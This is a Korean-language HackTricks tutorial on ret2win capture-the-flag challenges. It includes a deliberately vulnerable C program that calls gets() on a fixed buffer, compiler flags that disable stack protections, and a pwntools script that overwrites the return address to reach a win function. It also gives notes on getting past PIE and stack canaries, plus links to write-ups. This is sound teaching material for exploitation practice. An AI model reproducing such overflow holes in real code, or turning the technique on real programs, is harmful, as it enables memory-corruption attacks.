# Ret2win

<details>

<summary><strong>htARTE (HackTricks AWS Red Team 전문가)</strong>에서 **제로부터 AWS 해킹을 배우세요**!</summary>

다른 HackTricks 지원 방법:

- **회사를 HackTricks에서 광고**하거나 **HackTricks를 PDF로 다운로드**하려면 [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
- [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구매하세요
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
- **💬 [Discord 그룹](https://discord.gg/hRep4RUj7f)** 또는 [텔레그램 그룹](https://t.me/peass)에 **가입**하거나 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)를 **팔로우**하세요.
- **HackTricks** 및 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 요령을 공유**하세요.

</details>

## 기본 정보

**Ret2win** 도전 과제는 **바이너리 공격**을 포함하는 **Capture The Flag (CTF)** 대회에서 인기 있는 카테고리입니다. 목표는 주어진 바이너리의 취약점을 이용하여 바이너리 내에서 특정하지 않은 함수를 실행하는 것입니다. 이 함수는 일반적으로 `win`, `flag` 등으로 명명되며 실행되면 일반적으로 플래그 또는 성공 메시지를 출력합니다. 도전 과제는 일반적으로 **스택의 반환 주소**를 덮어쓰고 실행 흐름을 원하는 함수로 전환하는 것을 포함합니다. 예시를 통해 더 자세히 설명하겠습니다:

### C 예시

취약점이 있는 간단한 C 프로그램과 호출할 `win` 함수가 있는 경우를 고려해보겠습니다:
```c
#include <stdio.h>
#include <string.h>

void win() {
printf("Congratulations! You've called the win function.\n");
}

void vulnerable_function() {
char buf[64];
gets(buf); // This function is dangerous because it does not check the size of the input, leading to buffer overflow.
}

int main() {
vulnerable_function();
return 0;
}
```
이 프로그램을 스택 보호 기능 없이 컴파일하고 **ASLR**를 비활성화하려면 다음 명령을 사용할 수 있습니다:
```sh
gcc -m32 -fno-stack-protector -z execstack -no-pie -o vulnerable vulnerable.c
```
* `-m32`: 프로그램을 32비트 바이너리로 컴파일합니다 (선택 사항이지만 CTF 도전 과제에서 일반적입니다).
* `-fno-stack-protector`: 스택 오버플로우에 대한 보호 기능을 비활성화합니다.
* `-z execstack`: 스택에서 코드 실행을 허용합니다.
* `-no-pie`: 위치 독립 실행 파일을 비활성화하여 `win` 함수의 주소가 변경되지 않도록 합니다.
* `-o vulnerable`: 출력 파일의 이름을 `vulnerable`로 지정합니다.

### Pwntools를 사용한 Python Exploit

해킹에는 **pwntools**를 사용할 것입니다. 이는 exploits를 작성하기 위한 강력한 CTF 프레임워크입니다. Exploit 스크립트는 버퍼 오버플로우를 유발하고 반환 주소를 `win` 함수의 주소로 덮어씁니다.
```python
from pwn import *

# Set up the process and context for the binary
binary_path = './vulnerable'
p = process(binary_path)
context.binary = binary_path

# Find the address of the win function
win_addr = p32(0x08048456)  # Replace 0x08048456 with the actual address of the win function in your binary

# Create the payload
# The buffer size is 64 bytes, and the saved EBP is 4 bytes. Hence, we need 68 bytes before we overwrite the return address.
payload = b'A' * 68 + win_addr

# Send the payload
p.sendline(payload)
p.interactive()
```
`win` 함수의 주소를 찾으려면 **gdb**, **objdump** 또는 이진 파일을 검사할 수 있는 다른 도구를 사용할 수 있습니다. 예를 들어 `objdump`를 사용하여 다음과 같이 할 수 있습니다:
```sh
objdump -d vulnerable | grep win
```
이 명령은 `win` 함수의 어셈블리 및 시작 주소를 표시합니다.

Python 스크립트는 `vulnerable_function`에서 처리될 때 정확히 조작된 메시지를 보내어 버퍼 오버플로우를 발생시키고 스택의 반환 주소를 `win`의 주소로 덮어씁니다. `vulnerable_function`이 반환될 때 `main`으로 반환하거나 종료하는 대신 `win`으로 이동하여 메시지가 인쇄됩니다.

## 보호 기능

* [**PIE**](../common-binary-protections-and-bypasses/pie/)은 **비활성화**되어야 합니다. 그렇지 않으면 주소가 실행마다 신뢰할 수 있게 유지되지 않거나 함수가 저장될 주소가 항상 동일하지 않아서 win 함수가 어디에 로드될지 알아내기 위해 일부 leak이 필요합니다. 오버플로우를 일으키는 함수가 `read` 또는 유사한 경우, 반환 주소를 win 함수로 변경하기 위해 1 또는 2바이트의 **부분 덮어쓰기**를 수행할 수 있습니다. ASLR 작동 방식으로 인해 마지막 세 개의 16진수는 무작위화되지 않으므로 올바른 반환 주소를 얻을 **1/16 확률** (1 nibble)이 있습니다.
* [**Stack Canaries**](../common-binary-protections-and-bypasses/stack-canaries/)도 비활성화되어야 합니다. 그렇지 않으면 손상된 EIP 반환 주소가 결코 따라지지 않을 것입니다.

## 다른 예제 및 참조

* [https://ir0nstone.gitbook.io/notes/types/stack/ret2win](https://ir0nstone.gitbook.io/notes/types/stack/ret2win)
* [https://guyinatuxedo.github.io/04-bof\_variable/tamu19\_pwn1/index.html](https://guyinatuxedo.github.io/04-bof\_variable/tamu19\_pwn1/index.html)
* 32비트, ASLR 없음
* [https://guyinatuxedo.github.io/05-bof\_callfunction/csaw16\_warmup/index.html](https://guyinatuxedo.github.io/05-bof\_callfunction/csaw16\_warmup/index.html)
* ASLR이 있는 64비트, 바이너리 주소의 leak 포함
* [https://guyinatuxedo.github.io/05-bof\_callfunction/csaw18\_getit/index.html](https://guyinatuxedo.github.io/05-bof\_callfunction/csaw18\_getit/index.html)
* 64비트, ASLR 없음
* [https://guyinatuxedo.github.io/05-bof\_callfunction/tu17\_vulnchat/index.html](https://guyinatuxedo.github.io/05-bof\_callfunction/tu17\_vulnchat/index.html)
* 32비트, ASLR 없음, 더블 스몰 오버플로우, 스택 오버플로우 및 두 번째 오버플로우 크기를 확장하는 첫 번째 오버플로우
* [https://guyinatuxedo.github.io/10-fmt\_strings/backdoor17\_bbpwn/index.html](https://guyinatuxedo.github.io/10-fmt\_strings/backdoor17\_bbpwn/index.html)
* 32비트, relro, 캐너리 없음, nx, pie 없음, 주소 `fflush`를 win 함수(ret2win)로 덮어쓰기 위한 형식 문자열
* [https://guyinatuxedo.github.io/15-partial\_overwrite/tamu19\_pwn2/index.html](https://guyinatuxedo.github.io/15-partial\_overwrite/tamu19\_pwn2/index.html)
* 32비트, nx, 다른 것 없음, EIP의 부분 덮어쓰기(1바이트)를 통해 win 함수 호출
* [https://guyinatuxedo.github.io/15-partial\_overwrite/tuctf17\_vulnchat2/index.html](https://guyinatuxedo.github.io/15-partial\_overwrite/tuctf17\_vulnchat2/index.html)
* 32비트, nx, 다른 것 없음, EIP의 부분 덮어쓰기(1바이트)를 통해 win 함수 호출
* [https://guyinatuxedo.github.io/35-integer\_exploitation/int\_overflow\_post/index.html](https://guyinatuxedo.github.io/35-integer\_exploitation/int\_overflow\_post/index.html)
* 프로그램은 숫자의 마지막 바이트만 유효성을 검사하여 입력 크기를 확인하므로 허용된 범위 내에서 마지막 바이트가 있으면 어떤 크기든 추가할 수 있습니다. 그런 다음 입력은 ret2win으로 악용된 버퍼 오버플로우를 생성합니다.
* [https://7rocky.github.io/en/ctf/other/blackhat-ctf/fno-stack-protector/](https://7rocky.github.io/en/ctf/other/blackhat-ctf/fno-stack-protector/)
* 64비트, relro, 캐너리 없음, nx, pie. win 함수(ret2win)를 호출하기 위한 부분 덮어쓰기
